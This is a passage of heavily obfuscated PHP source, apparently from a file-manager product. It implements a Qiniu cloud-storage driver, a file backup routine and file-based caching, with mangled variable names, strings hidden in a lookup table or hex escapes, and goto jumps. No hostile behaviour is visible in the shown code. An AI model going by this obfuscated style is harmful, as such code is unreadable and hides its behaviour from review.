êüÙ½[244]]) && $ÏË°¿ÂÊ[$ª êüÙ½[244]]) { $Â“›Ë“Ú[$ª êüÙ½[245]] = $ÏË°¿ÂÊ[$ª êüÙ½[244]]; } if (isset($ÏË°¿ÂÊ[$ª êüÙ½[255]]) && $ÏË°¿ÂÊ[$ª êüÙ½[255]]) { $Â“›Ë“Ú[$ª êüÙ½[245]] = $ÏË°¿ÂÊ[$ª êüÙ½[255]]; } if (isset($ÏË°¿ÂÊ[$ª êüÙ½[1540]])) { $Â“›Ë“Ú[$ª êüÙ½[98]] = substr($ÏË°¿ÂÊ[$ª êüÙ½[1540]] . $ª êüÙ½[12], 0, 10); } if (isset($ÏË°¿ÂÊ[$ª êüÙ½[1539]])) { $Â“›Ë“Ú[$ª êüÙ½[89]] = $ÏË°¿ÂÊ[$ª êüÙ½[1539]]; } return $Â“›Ë“Ú; } public function folderInfo($Ş¡˜íÕ, $°–—Ä¹Š = false) { $ìÓºƒ =& $_SERVER[÷ôÚîå]; $®ıÖÀÅû = array($ìÓºƒ[32] => $this->pathThis($Ş¡˜íÕ), $ìÓºƒ[97] => $this->getPathOuter($ìÓºƒ[8] . $Ş¡˜íÕ), $ìÓºƒ[33] => $ìÓºƒ[88]); if ($°–—Ä¹Š) { return $®ıÖÀÅû; } $®ıÖÀÅû[$ìÓºƒ[241]] = $®ıÖÀÅû[$ìÓºƒ[98]] = 0; $®ıÖÀÅû[$ìÓºƒ[242]] = $®ıÖÀÅû[$ìÓºƒ[243]] = !0; $Ş¡˜íÕ = rtrim($Ş¡˜íÕ, $ìÓºƒ[8]) . $ìÓºƒ[8]; $œâö®Èç = $this->objectMeta($Ş¡˜íÕ); if (isset($œâö®Èç[$ìÓºƒ[1540]])) { $®ıÖÀÅû[$ìÓºƒ[98]] = substr($œâö®Èç[$ìÓºƒ[1540]] . $ìÓºƒ[12], 0, 10); } return $®ıÖÀÅû; } public function listPath($Ôî¤º“—, $Áîº©ÅÖ = false) { $‡ãú•»Œ =& $_SERVER[÷ôÚîå]; $Ä‚¶ƒ§¸ = $this->fileList($Ôî¤º“—, $‡ãú•»Œ[8], !0); foreach ($Ä‚¶ƒ§¸[$‡ãú•»Œ[95]] as $­Íå›®Á => $¼ŒØÁş¦) { $Ä‚¶ƒ§¸[$‡ãú•»Œ[95]][$­Íå›®Á] = $this->folderInfo($¼ŒØÁş¦, $Áîº©ÅÖ); } foreach ($Ä‚¶ƒ§¸[$‡ãú•»Œ[96]] as $­Íå›®Á => $¼ŒØÁş¦) { $Ä‚¶ƒ§¸[$‡ãú•»Œ[96]][$­Íå›®Á] = $this->fileInfo($¼ŒØÁş¦[$‡ãú•»Œ[107]], $Áîº©ÅÖ, $¼ŒØÁş¦); } return $Ä‚¶ƒ§¸; } public function has($ÉÏàÎù˜, $şÏæ»çï = false, $ªÉ‹ô–â = true) { $üŒ§áçá =& $_SERVER[÷ôÚîå]; $ÉÏàÎù˜ = trim($ÉÏàÎù˜, $üŒ§áçá[8]); $ñãÉ¦ = empty($ÉÏàÎù˜) && $ÉÏàÎù˜ !== $üŒ§áçá[238] ? $üŒ§áçá[12] : $ÉÏàÎù˜ . $üŒ§áçá[8]; $’˜ˆ†ã = $üŒ§áçá[12]; $çïæ÷‘ = 500; $·Äê¯é = $üŒ§áçá[8]; $à¤‹êü = $¾ñşôãó = 0; while (!0) { check_abort(); list($»ºÙÎûÕ, $˜¥°İ£ò) = $this->bucketManager->listFiles($this->bucket, $ñãÉ¦, $’˜ˆ†ã, $çïæ÷‘, $·Äê¯é); if ($˜¥°İ£ò) { break; } $’˜ˆ†ã = array_key_exists($üŒ§áçá[1485], $»ºÙÎûÕ) ? $’˜ˆ†ã = $»ºÙÎûÕ[$üŒ§áçá[1541]] : $üŒ§áçá[12]; if ($şÏæ»çï) { if (!empty($»ºÙÎûÕ[$üŒ§áçá[1542]])) { $à¤‹êü += count($»ºÙÎûÕ[$üŒ§áçá[1542]]); } if (!empty($»ºÙÎûÕ[$üŒ§áçá[1543]])) { $¾ñşôãó += count($»ºÙÎûÕ[$üŒ§áçá[1543]]); } if ($’˜ˆ†ã === $üŒ§áçá[12]) { break; } continue; } if ($ªÉ‹ô–â) { if (!empty($»ºÙÎûÕ[$üŒ§áçá[1542]])) { return !0; } } else { if (!empty($»ºÙÎûÕ[$üŒ§áçá[1543]])) { return !0; } } if ($’˜ˆ†ã === $üŒ§áçá[12]) { break; } } if ($şÏæ»çï) { return array($üŒ§áçá[249] => $à¤‹êü, $üŒ§áçá[250] => $¾ñşôãó); } return !1; } public function listAll($íªñòË§) { $ôèÇƒÒ˜ =& $_SERVER[÷ôÚîå]; $¾˜á£› = $this->fileList($íªñòË§, $ôèÇƒÒ˜[12], !0); $Ö¢âÒŸ = array_to_keyvalue($¾˜á£›[$ôèÇƒÒ˜[96]], $ôèÇƒÒ˜[32]); foreach ($¾˜á£›[$ôèÇƒÒ˜[95]] as $‡Ü¿ô±¯) { if (is_string($‡Ü¿ô±¯)) { $Ö¢âÒŸ[$‡Ü¿ô±¯] = array($ôèÇƒÒ˜[89] => 0); } } return $this->listAllFiles($íªñòË§, $Ö¢âÒŸ); } private function fileList($°«ÁôŠ, $øˆÜñáµ = '', $‘İ»äÇÅ = 0) { $­ñšÀºÆ =& $_SERVER[÷ôÚîå]; $°«ÁôŠ = trim($°«ÁôŠ, $­ñšÀºÆ[8]); $å¨¬ıÇ = empty($°«ÁôŠ) && $°«ÁôŠ !== $­ñšÀºÆ[238] ? $­ñšÀºÆ[12] : $°«ÁôŠ . $­ñšÀºÆ[8]; $à­¡Ü® = $­ñšÀºÆ[12]; $«§éú– = 1000; $üÜ¬µÎ· = $°Ÿ¬ª± = array(); while (!0) { check_abort(); list($µÏ½Í¿‰, $Õöéâ¡®) = $this->bucketManager->listFiles($this->bucket, $å¨¬ıÇ, $à­¡Ü®, $«§éú–, $øˆÜñáµ); if ($Õöéâ¡®) { break; } $à­¡Ü® = array_key_exists($­ñšÀºÆ[1485], $µÏ½Í¿‰) ? $à­¡Ü® = $µÏ½Í¿‰[$­ñšÀºÆ[1541]] : $­ñšÀºÆ[12]; $·¤äÂ¼ = isset($µÏ½Í¿‰[$­ñšÀºÆ[1542]]) ? $µÏ½Í¿‰[$­ñšÀºÆ[1542]] : array(); $‚İÄäÆ› = isset($µÏ½Í¿‰[$­ñšÀºÆ[1543]]) ? $µÏ½Í¿‰[$­ñšÀºÆ[1543]] : array(); foreach ($·¤äÂ¼ as $Éü¢¸É„) { if ($Éü¢¸É„[$­ñšÀºÆ[107]] == $å¨¬ıÇ) { continue; } $ÇÂÄÉ· = $Éü¢¸É„[$­ñšÀºÆ[107]]; $÷Œ¾±Ÿ¿ = $Éü¢¸É„[$­ñšÀºÆ[1539]]; $Éü¢¸É„[$­ñšÀºÆ[89]] = $÷Œ¾±Ÿ¿; $ÄÜôˆÊ„ = $÷Œ¾±Ÿ¿ == 0 && substr($ÇÂÄÉ·, strlen($ÇÂÄÉ·) - 1, 1) == $­ñšÀºÆ[8] ? !0 : !1; $this->cacheMethodInfoSet($ÇÂÄÉ·, $ÄÜôˆÊ„, $Éü¢¸É„); if ($ÄÜôˆÊ„) { $üÜ¬µÎ·[] = $ÇÂÄÉ·; continue; } $°Ÿ¬ª±[] = $‘İ»äÇÅ ? $Éü¢¸É„ : $ÇÂÄÉ·; } foreach ($‚İÄäÆ› as $ÇÂÄÉ·) { if ($ÇÂÄÉ· == $å¨¬ıÇ) { continue; } $üÜ¬µÎ·[] = $ÇÂÄÉ·; $this->cacheMethodInfoSet($ÇÂÄÉ·, !0); } if ($à­¡Ü® === $­ñšÀºÆ[12]) { break; } } $this->cacheMethodInfoSet($°«ÁôŠ, !0); return array($­ñšÀºÆ[95] => $üÜ¬µÎ·, $­ñšÀºÆ[96] => $°Ÿ¬ª±); } public function canRead($ÏÛê±×) { return $this->exist($ÏÛê±×) ? !0 : !1; } public function canWrite($Òµéó´¤) { return $this->exist($Òµéó´¤) ? !0 : !1; } public function getContent($”ÔŞŞ€) { return $this->fileSubstr($”ÔŞŞ€, 0, -1); } public function setContent($åÆç“, $óü½»»½ = '') { $äÁØÌ»õ = $this->tempFile($this->pathThis($åÆç“)); file_put_contents($äÁØÌ»õ, $óü½»»½); if ($this->upload($åÆç“, $äÁØÌ»õ)) { $this->tempFileRemve($äÁØÌ»õ); return !0; } return !1; } public function refreshUrls($Á›‹ï‹®) { $İÉæÊ¾ =& $_SERVER[÷ôÚîå]; $ºÈ½‹• = array(); if (is_array($Á›‹ï‹®)) { foreach ($Á›‹ï‹® as $ÍäûÑõ) { $ºÈ½‹•[] = $this->link($ÍäûÑõ); } } else { $ºÈ½‹•[] = $this->link($Á›‹ï‹®); } $ åšõ¯¯ = new Qiniu\Cdn\CdnManager($this->auth); list($¿‘–‹œó, $õ»ò×¡ø) = $ åšõ¯¯->refreshUrls($ºÈ½‹•); if ($õ»ò×¡ø) { return !1; } return $¿‘–‹œó[$İÉæÊ¾[1275]] == $İÉæÊ¾[848] ? !0 : !1; } public function fileSubstr($£¢Ó˜­, $ŒÍÉ À€, $ ã¨º²) { $íÌ¼Í½÷ =& $_SERVER[÷ôÚîå]; if (!($çîîİˆ = $this->link($£¢Ó˜­))) { return !1; } $±©×ß = !1; if ($ ã¨º² > 0) { $ğ…ò“‹ù = $ŒÍÉ À€ + $ ã¨º² - 1; $±©×ß = array($íÌ¼Í½÷[1544] . $ŒÍÉ À€ . $íÌ¼Í½÷[471] . $ğ…ò“‹ù); } $¼Ä ™ø¨ = url_request($çîîİˆ, $íÌ¼Í½÷[271], !1, $±©×ß); return $¼Ä ™ø¨[$íÌ¼Í½÷[839]] ? $¼Ä ™ø¨[$íÌ¼Í½÷[1298]] : !1; } public function upload($§Çœ­—¡, $÷Öó„¡ş, $˜ø¼ã = false, $°Ô¼×í = REPEAT_REPLACE) { $ô®Á‡Åà = new Qiniu\Storage\UploadManager(); $‰¨Û—Ú = $this->auth->uploadToken($this->bucket, $§Çœ­—¡); $áÔØ¹ = get_file_mime(get_path_ext($÷Öó„¡ş)); list($Ìî›µöƒ, $ÏÉ‹º£Ö) = $ô®Á‡Åà->putFile($‰¨Û—Ú, $§Çœ­—¡, $÷Öó„¡ş, null, $áÔØ¹); return $ÏÉ‹º£Ö ? !1 : $this->getPathOuter($§Çœ­—¡); } public function uploadFormData($è¼¬Û’, $ıÍ»¼¾ê = 3600) { return $this->uploadToken($è¼¬Û’, $ıÍ»¼¾ê); } public function multiUploadFormData($§®­Ê«æ, $åæ¡«˜ê = 3600) { return $this->uploadToken($§®­Ê«æ, $åæ¡«˜ê); } private function uploadToken($Œ¿§Ï¢â, $Œ•–º¶ = 3600) { $›çüò†â =& $_SERVER[÷ôÚîå]; $Ğ°ÅüÔ´ = $Œ•–º¶; $ĞÃ®äş´ = array($›çüò†â[1545] => $›çüò†â[1546]); $¸å·Á¨· = $Œ¿§Ï¢â; $ÏñŒ‘— = $this->auth->uploadToken($this->bucket, $¸å·Á¨·, $Ğ°ÅüÔ´, $ĞÃ®äş´, !0); $äÒâí¼€ = empty($this->region) || $this->region == $›çüò†â[1547] ? $›çüò†â[12] : $›çüò†â[471] . $this->region; $ğ—ö§¾ = http_type() . "\x3a\57\x2f\165\x70\x6c\157\x61\x64{$äÒâí¼€}\x2e\161\x69\x6e\x69\165\160\x2e\143\157\x6d\x2f"; return array($›çüò†â[1548] => $ÏñŒ‘—, $›çüò†â[1549] => $ğ—ö§¾); } public function download($øã‰¨ß , $‰§£Šîµ) { $„ä³´§ = IO::getPathInner(IO::mkfile($‰§£Šîµ)); if (!($Ò³åÂ™ˆ = $this->link($øã‰¨ß ))) { return !1; } $¹Â–Äğ’ = 0; $İê’íÚ = 1024 * 200; $©¬ô¾ö = fopen($„ä³´§, $_SERVER[÷ôÚîå][1550]); while (!0) { $ÏÉÔóìŒ = $this->fileSubstr($øã‰¨ß , $¹Â–Äğ’, $İê’íÚ); if ($ÏÉÔóìŒ === !1) { return !1; } fwrite($©¬ô¾ö, $ÏÉÔóìŒ); $¹Â–Äğ’ += $İê’íÚ; if (strlen($ÏÉÔóìŒ) < $İê’íÚ) { break; } } fclose($©¬ô¾ö); return $‰§£Šîµ; } public function link($ÏĞÃÛ›«, $Ã¬¾üò’ = '') { if (!$this->isFile($ÏĞÃÛ›«)) { return !1; } $üÆËÁïª = $this->getHost() . $_SERVER[÷ôÚîå][8] . $this->pathEncode($ÏĞÃÛ›«) . $Ã¬¾üò’; return $this->auth->privateDownloadUrl($üÆËÁïª, 3600 * 12); } public function fileOut($‚İ¼ÎöĞ, $Ô¥âàíÇ = false, $‹„§İ¿º = false, $ªêàÈ÷ò = '') { $†²à‡¼» =& $_SERVER[÷ôÚîå]; if ($this->isFileOutServer()) { return $this->fileOutServer($‚İ¼ÎöĞ, $Ô¥âàíÇ, $‹„§İ¿º, $ªêàÈ÷ò); } if (!$‹„§İ¿º) { $‹„§İ¿º = $this->pathThis($‚İ¼ÎöĞ); } $ÈËáùÈ = $Ô¥âàíÇ ? $†²à‡¼»[1551] . rawurlencode($‹„§İ¿º) : $†²à‡¼»[12]; $œ¨¼Üó¿ = $this->link($‚İ¼ÎöĞ, $ÈËáùÈ); $this->fileOutLink($œ¨¼Üó¿); } public function fileOutServer($¼ÍÀ™ö¬, $õ ÌêÕ = false, $£ßö‚ì = false, $‰ÙáÃà = '') { parent::fileOut($¼ÍÀ™ö¬, $õ ÌêÕ, $£ßö‚ì, $‰ÙáÃà); } public function fileOutImage($ ƒ•¾îÓ, $Ç¡Í = 250) { if ($this->size($ ƒ•¾îÓ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ ƒ•¾îÓ, $Ç¡Í); } $µÈËüõ” = $this->link($ ƒ•¾îÓ, $_SERVER[÷ôÚîå][1552] . $Ç¡Í); $this->fileOutLink($µÈËüõ”); } public function fileOutImageServer($€æŠëŞÊ, $¼ûàÆå» = 250) { parent::fileOutImage($€æŠëŞÊ, $¼ûàÆå»); } public function hashMd5($ıÑÁ«ä¯) { $ÄÔ¶ÖŸó =& $_SERVER[÷ôÚîå]; $âà÷Şßô = $this->objectMeta($ıÑÁ«ä¯); return isset($âà÷Şßô[$ÄÔ¶ÖŸó[255]]) ? $âà÷Şßô[$ÄÔ¶ÖŸó[255]] : !1; $É»€Æ‘å = $this->link($ıÑÁ«ä¯, $ÄÔ¶ÖŸó[1553]); } public function size($åË½«õ ) { $…üÙåĞá = $this->objectMeta($åË½«õ ); return $…üÙåĞá ? $…üÙåĞá[$_SERVER[÷ôÚîå][89]] : 0; } public function info($ÓğÇ½¯‡) { if ($this->isFolder($ÓğÇ½¯‡)) { return $this->folderInfo($ÓğÇ½¯‡); } else { if ($this->isFile($ÓğÇ½¯‡)) { return $this->fileInfo($ÓğÇ½¯‡); } } return !1; } public function exist($¬×Ø±º ) { return $this->isFile($¬×Ø±º ) || $this->isFolder($¬×Ø±º ); } public function isFile($ëÂ¼ÄáÛ) { return !$this->isFolder($ëÂ¼ÄáÛ) && $this->objectMeta($ëÂ¼ÄáÛ); } public function isFolder($—ŸºÎåß) { return $this->cacheMethod($_SERVER[÷ôÚîå][189], $—ŸºÎåß); } protected function objectMeta($‘İã¾•Ê) { return $this->cacheMethod($_SERVER[÷ôÚîå][191], $‘İã¾•Ê); } protected function _objectMeta($²Ÿú•äÚ) { $œÉõïë¿ =& $_SERVER[÷ôÚîå]; list($Ìñ‰°Âø, $¶¶¦îÙî) = $this->bucketManager->stat($this->bucket, $²Ÿú•äÚ); if ($Ìñ‰°Âø) { $Ìñ‰°Âø[$œÉõïë¿[89]] = intval($Ìñ‰°Âø[$œÉõïë¿[1539]]); } return $Ìñ‰°Âø; } protected function _isFolder($×Ê³‚Ó) { $ˆÃÌ—İÅ =& $_SERVER[÷ôÚîå]; if ($×Ê³‚Ó == $ˆÃÌ—İÅ[12] || $×Ê³‚Ó == $ˆÃÌ—İÅ[8]) { return !0; } list($½œßô¢æ, $¹’øİ¹) = $this->bucketManager->listFiles($this->bucket, trim($×Ê³‚Ó, $ˆÃÌ—İÅ[8]) . $ˆÃÌ—İÅ[8], $ˆÃÌ—İÅ[12], 1, $ˆÃÌ—İÅ[8]); return !empty($½œßô¢æ[$ˆÃÌ—İÅ[1542]]) || !empty($½œßô¢æ[$ˆÃÌ—İÅ[1543]]) ? !0 : !1; } } goto d‡Ú´ŞÖ†; d©Ïˆí‰­ğ: class BackupFile { public function __construct() { } public function index() { $ó­”û = Backup::get(); $ìôíù¯Å = $ó­”û[$_SERVER[÷ôÚîå][378]][$_SERVER[÷ôÚîå][240]][$_SERVER[÷ôÚîå][550]]; $©‡ô¼Ó× = array($_SERVER[÷ôÚîå][551] => array($_SERVER[÷ôÚîå][897], $ìôíù¯Å), $_SERVER[÷ôÚîå][898] => array($_SERVER[÷ôÚîå][416], $ó­”û[$_SERVER[÷ôÚîå][841]])); $ÔÀ§ = (int) Model($_SERVER[÷ôÚîå][878])->where($©‡ô¼Ó×)->count($_SERVER[÷ôÚîå][550]); $ºÌİ¾é¾ = (int) Model($_SERVER[÷ôÚîå][878])->where($©‡ô¼Ó×)->sum($_SERVER[÷ôÚîå][89]); $âØ·–ñø = new TaskFileTransfer($_SERVER[÷ôÚîå][899], $_SERVER[÷ôÚîå][872], $ÔÀ§, LNG($_SERVER[÷ôÚîå][873]) . $_SERVER[÷ôÚîå][874] . LNG($_SERVER[÷ôÚîå][900])); $âØ·–ñø->task[$_SERVER[÷ôÚîå][852]] = $ºÌİ¾é¾; $’¹¡è¶’ = array($_SERVER[÷ôÚîå][901] => $ÔÀ§, $_SERVER[÷ôÚîå][902] => $ºÌİ¾é¾, $_SERVER[÷ôÚîå][903] => time()); Backup::set($’¹¡è¶’); $Øàè‡¡Ù = !0; $–…şËáá = $this->storeIds(); $¢±ŞÉ¯ = 1; $Ç¸êÙ¡ = 1000; $ûëïÚì¡ = $¥æ°áõç = 0; $‚Ø’» = array(); $–˜Š¸Ü± = $ìµÙëËõ = 0; do { $ÊÂ…¯‡á = $_SERVER[÷ôÚîå][904]; $¡¡ôÌğü = Model($_SERVER[÷ôÚîå][878])->where($©‡ô¼Ó×)->field($ÊÂ…¯‡á)->order($_SERVER[÷ôÚîå][905])->selectPage($Ç¸êÙ¡, $¢±ŞÉ¯); $ø°åìı° = !empty($¡¡ôÌğü[$_SERVER[÷ôÚîå][454]]) ? $¡¡ôÌğü[$_SERVER[÷ôÚîå][454]] : array(); foreach ($ø°åìı° as $áì¤’ƒı) { if (!$this->_fileExist($áì¤’ƒı, $‚Ø’», $–…şËáá)) { write_log("\x66\151\x6c\x65\40\156\x6f\164\40\145\x78\151\x73\x74\x2e\146\151\154\x65\x49\x44\72{$áì¤’ƒı[$_SERVER[÷ôÚîå][550]]}\x2c\40\x70\x61\164\x68\72{$áì¤’ƒı[$_SERVER[÷ôÚîå][97]]}", $_SERVER[÷ôÚîå][906]); continue; } $Š©·â¾² = $áì¤’ƒı[$_SERVER[÷ôÚîå][97]]; $ÒÕÑàŒ± = "\x7b\151\157\x3a{$ó­”û[$_SERVER[÷ôÚîå][841]]}\175" . substr($Š©·â¾², strlen("\x7b\151\157\x3a{$áì¤’ƒı[$_SERVER[÷ôÚîå][907]]}\x7d")); if (IO::exist($ÒÕÑàŒ±)) { $âØ·–ñø->updateFileEnd($áì¤’ƒı[$_SERVER[÷ôÚîå][32]], $áì¤’ƒı[$_SERVER[÷ôÚîå][89]]); } else { $ÒÕÑàŒ± = get_path_father($ÒÕÑàŒ±); IO::mkdir($ÒÕÑàŒ±); if (!IO::copy($Š©·â¾², $ÒÕÑàŒ±, $_SERVER[÷ôÚîå][908])) { write_log($_SERVER[÷ôÚîå][909] . $Š©·â¾² . $_SERVER[÷ôÚîå][893] . $ÒÕÑàŒ± . $_SERVER[÷ôÚîå][188], $_SERVER[÷ôÚîå][872]); $Øàè‡¡Ù = !1; break; } } $ìôíù¯Å = $áì¤’ƒı[$_SERVER[÷ôÚîå][550]]; $¥æ°áõç += 1; $ûëïÚì¡ += $áì¤’ƒı[$_SERVER[÷ôÚîå][89]]; $ìµÙëËõ += 1; $–˜Š¸Ü± += $áì¤’ƒı[$_SERVER[÷ôÚîå][89]]; if ($ûëïÚì¡ >= 1024 * 1024 * 100) { $’¹¡è¶’ = array($_SERVER[÷ôÚîå][840] => $ìôíù¯Å, $_SERVER[÷ôÚîå][910] => $ìµÙëËõ, $_SERVER[÷ôÚîå][911] => $–˜Š¸Ü±); Backup::set($’¹¡è¶’); $ûëïÚì¡ = $¥æ°áõç = 0; } } $È¯ù‚•× = count($ø°åìı°); $¢±ŞÉ¯++; } while ($È¯ù‚•× == $Ç¸êÙ¡); $âØ·–ñø->end(); $’¹¡è¶’ = array($_SERVER[÷ôÚîå][912] => 1, $_SERVER[÷ôÚîå][850] => time(), $_SERVER[÷ôÚîå][864] => 1, $_SERVER[÷ôÚîå][840] => $ìôíù¯Å, $_SERVER[÷ôÚîå][913] => time()); if ($¥æ°áõç) { $’¹¡è¶’[$_SERVER[÷ôÚîå][910]] = $ìµÙëËõ; $’¹¡è¶’[$_SERVER[÷ôÚîå][911]] = $–˜Š¸Ü±; } Backup::set($’¹¡è¶’); return !0; } private function _fileExist($ã¹‹º×, &$³Ø¥”ô, $‚ş—¢ê) { $Õ¯´š–Å =& $_SERVER[÷ôÚîå]; $®¼Ù‚¾› = $ã¹‹º×[$Õ¯´š–Å[97]]; if (in_array($ã¹‹º×[$Õ¯´š–Å[550]], $³Ø¥”ô)) { return !1; } if (!in_array($ã¹‹º×[$Õ¯´š–Å[907]], $‚ş—¢ê)) { return !1; } if (IO::exist($®¼Ù‚¾›)) { return !0; } $¾Ê¨”£¨ = get_path_father($®¼Ù‚¾›); if (IO::exist($¾Ê¨”£¨)) { $³Ø¥”ô[] = $ã¹‹º×[$Õ¯´š–Å[550]]; return !1; } $¬üø¾ğ = array($Õ¯´š–Å[907] => $ã¹‹º×[$Õ¯´š–Å[907]], $Õ¯´š–Å[97] => array($Õ¯´š–Å[468], "{$¾Ê¨”£¨}\x25")); $ª¶•ø³‹ = Model($Õ¯´š–Å[878])->where($¬üø¾ğ)->field($Õ¯´š–Å[551])->select(); $³Ø¥”ô = array_merge($³Ø¥”ô, array_to_keyvalue($ª¶•ø³‹, $Õ¯´š–Å[12], $Õ¯´š–Å[550])); return !1; } private function _fileFilter($Ééøî“—) { $ïã½İá¸ =& $_SERVER[÷ôÚîå]; return; if (empty($Ééøî“—)) { return; } $ÇœÅÖĞ· = array($ïã½İá¸[550] => array($ïã½İá¸[7], array_unique($Ééøî“—))); $¸À§Øô‰ = Model($ïã½İá¸[914])->where($ÇœÅÖĞ·)->field($ïã½İá¸[203])->select(); foreach ($¸À§Øô‰ as $ÊÑµ½™) { Model($ïã½İá¸[914])->remove($ÊÑµ½™[$ïã½İá¸[203]], !1); } } private function storeIds() { $Ÿ‚—Ê«È =& $_SERVER[÷ôÚîå]; $µŠİİÁ¤ = Model($Ÿ‚—Ê«È[856])->listData(); $š“Åöğã = array(); $¾åæ³ = $GLOBALS[$Ÿ‚—Ê«È[6]][$Ÿ‚—Ê«È[102]][$Ÿ‚—Ê«È[915]]; foreach ($µŠİİÁ¤ as $ƒ©¡öËı) { $’ÉÊÆÓë = strtolower($ƒ©¡öËı[$Ÿ‚—Ê«È[108]]); if (!isset($¾åæ³[$’ÉÊÆÓë])) { continue; } $Ñ„‚ß = $Ÿ‚—Ê«È[87] . (isset($¾åæ³[$’ÉÊÆÓë]) ? $¾åæ³[$’ÉÊÆÓë] : ucfirst($’ÉÊÆÓë)); if (!class_exists($Ñ„‚ß)) { continue; } $š“Åöğã[] = $ƒ©¡öËı[$Ÿ‚—Ê«È[484]]; } return $š“Åöğã; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ŒÇ–Ûá¾ =& $_SERVER[÷ôÚîå]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $­¶Û©­ = $GLOBALS[$ŒÇ–Ûá¾[6]][$ŒÇ–Ûá¾[434]]; $º¯”Šß¬ = $­¶Û©­[$­¶Û©­[$ŒÇ–Ûá¾[916]]]; $ş„ÚÈ´ = $­¶Û©­[$ŒÇ–Ûá¾[917]]; switch ($­¶Û©­[$ŒÇ–Ûá¾[916]]) { case $ŒÇ–Ûá¾[21]: self::$handle = Model($ŒÇ–Ûá¾[918]); break; case $ŒÇ–Ûá¾[919]: self::$handle = new CacheRedis($º¯”Šß¬, $ş„ÚÈ´); break; case $ŒÇ–Ûá¾[920]: self::$handle = new CacheMemcached($º¯”Šß¬, $ş„ÚÈ´); break; case $ŒÇ–Ûá¾[240]: self::$handle = new CacheFile($º¯”Šß¬, $ş„ÚÈ´); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($õÊÍ©Æ®) { if (is_array($õÊÍ©Æ®) || is_object($õÊÍ©Æ®)) { $õÊÍ©Æ® = json_encode($õÊÍ©Æ®); } $õÊÍ©Æ® = rawurlencode($õÊÍ©Æ®); return md5(KOD_SITE_ID . $_SERVER[÷ôÚîå][11] . $õÊÍ©Æ®); } public static function get($ÂÈˆÛÀ™, $ô«ùÃÁñ = false) { $ÍŞºéı¶ = self::key($ÂÈˆÛÀ™); $øû¢—òŒ = self::init(); if ($ô«ùÃÁñ) { return unserialize($øû¢—òŒ->get($ÍŞºéı¶)); } if (!isset(self::$memoryCache[$ÍŞºéı¶])) { $¿¶¤¸ÃÓ = $øû¢—òŒ->get($ÍŞºéı¶); self::$memoryCache[$ÍŞºéı¶] = unserialize($¿¶¤¸ÃÓ); } return self::$memoryCache[$ÍŞºéı¶]; } public static function set($­¡™œš©, $‰æÜÁŸ, $©†Ùïû€ = false) { $Ÿä®›Àœ =& $_SERVER[÷ôÚîå]; $‘•´­€Ü = self::key($­¡™œš©); if (isset(self::$memoryCache[$‘•´­€Ü]) && self::$memoryCache[$‘•´­€Ü] === $‰æÜÁŸ) { return !0; } if ($©†Ùïû€ === 0) { self::$memoryCache[$‘•´­€Ü] = $‰æÜÁŸ; return !0; } $¯©·”³¨ = self::init(); $àò–‹¥Î = serialize($‰æÜÁŸ); CacheLock::lock($­¡™œš© . $Ÿä®›Àœ[921]); $Ğ’«Ó‰ = $¯©·”³¨->set($‘•´­€Ü, $àò–‹¥Î, $©†Ùïû€); self::$memoryCache[$‘•´­€Ü] = $‰æÜÁŸ; CacheLock::unlock($­¡™œš© . $Ÿä®›Àœ[921]); return $Ğ’«Ó‰; } public static function getCall($íà¬İĞŞ, $æ©°Ä¯, $şÇ›–æÜ, $ëüûÂù× = array()) { $ÀˆÙ“Ëù =& $_SERVER[÷ôÚîå]; $¹†˜øƒ— = self::get($íà¬İĞŞ); if ($¹†˜øƒ— || $¹†˜øƒ— === $ÀˆÙ“Ëù[12]) { return $¹†˜øƒ—; } $¹†˜øƒ— = call_user_func_array($şÇ›–æÜ, $ëüûÂù×); $¹†˜øƒ— = $¹†˜øƒ— ? $¹†˜øƒ— : $ÀˆÙ“Ëù[12]; self::set($íà¬İĞŞ, $¹†˜øƒ—, $æ©°Ä¯); return $¹†˜øƒ—; } public static function remove($‘çñş²í) { $ÒÈ—´Â¾ = self::key($‘çñş²í); unset(self::$memoryCache[$ÒÈ—´Â¾]); self::clearTimeout(); CacheLock::lock($‘çñş²í); $í¥•ú¸ = self::init()->remove($ÒÈ—´Â¾); CacheLock::unlock($‘çñş²í); return $í¥•ú¸; } public static function removeMemory($à˜½©Ğ½) { $êÒª•Ù = self::key($à˜½©Ğ½); unset(self::$memoryCache[$êÒª•Ù]); } public static function clearMemory($şÀè´Æ– = false) { if ($şÀè´Æ–) { $şÀè´Æ– = self::key($şÀè´Æ–); unset(self::$memoryCache[$şÀè´Æ–]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[÷ôÚîå][922])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[÷ôÚîå][923])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Îä©”êĞ, $øà«‚Ù) { $ï‚ŠÃÇ =& $_SERVER[÷ôÚîå]; $this->cachePath = $Îä©”êĞ[$ï‚ŠÃÇ[97]]; $this->prefix = $ï‚ŠÃÇ[924]; $this->cacheTime = $øà«‚Ù; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Éí´ˆÀö) { $ƒŸÃ÷™ =& $_SERVER[÷ôÚîå]; $Éí´ˆÀö = str_replace(array($ƒŸÃ÷™[925], $ƒŸÃ÷™[110], $ƒŸÃ÷™[86]), $ƒŸÃ÷™[926], $Éí´ˆÀö); return $this->cachePath . $ƒŸÃ÷™[927] . $Éí´ˆÀö . $ƒŸÃ÷™[928]; } public function set($Î½¾÷ø÷, $Š“Íß¬», $²‘šÙ™† = false) { $²‘šÙ™† = $²‘šÙ™† ? $²‘šÙ™† : $this->cacheTime; $«Ç·ô¥” = $this->getFile($Î½¾÷ø÷); if (file_put_contents($«Ç·ô¥”, $this->prefix . $Š“Íß¬», LOCK_EX)) { @touch($«Ç·ô¥”, intval(time() + $²‘šÙ™†)); clearstatcache(); return !0; } @unlink($«Ç·ô¥”); return !1; } public function get($ãÆéƒ«) { $åıÙ£‚À = $this->getFile($ãÆéƒ«); if (file_exists($åıÙ£‚À) && filemtime($åıÙ£‚À) < time()) { @unlink($åıÙ£‚À); return !1; } $²„…½£ò = @file_get_contents($åıÙ£‚À); return substr($²„…½£ò, strlen($this->prefix)); } public function remove($ú¡úÔŒÌ) { $ÅĞ‹ìË  = 